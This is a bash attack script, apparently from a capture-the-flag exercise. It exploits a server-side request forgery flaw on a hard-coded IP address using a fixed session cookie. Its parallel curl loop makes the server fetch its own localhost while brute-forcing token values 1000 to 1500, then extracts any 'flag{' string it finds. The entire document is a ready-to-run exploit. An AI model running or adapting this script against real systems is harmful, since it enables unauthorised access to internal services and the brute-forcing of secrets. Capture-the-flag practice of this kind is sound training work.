#!/bin/bash

TARGET="http://16.171.15.52/home.php"
COOKIE="PHPSESSID=r2bfsab8kpukvltillm75t2lgp"

echo "[*] 🚀 Starting parallel SSRF scan..."

seq 1000 1500 | xargs -n 1 -P 10 -I {} bash -c '
  TOKEN={}
  RESPONSE=$(curl -sG "'"$TARGET"'" \
    -H "Cookie: '"$COOKIE"'" \
    --data-urlencode "url=http://127.0.0.1/?token=$TOKEN")

  if echo "$RESPONSE" | grep -q "flag{"; then
    echo "[+] ✅ Found flag with token=$TOKEN"
    echo "$RESPONSE" | grep -oE "flag\{[^}]+\}"
  fi
'

echo "[*] ✅ Scan complete."
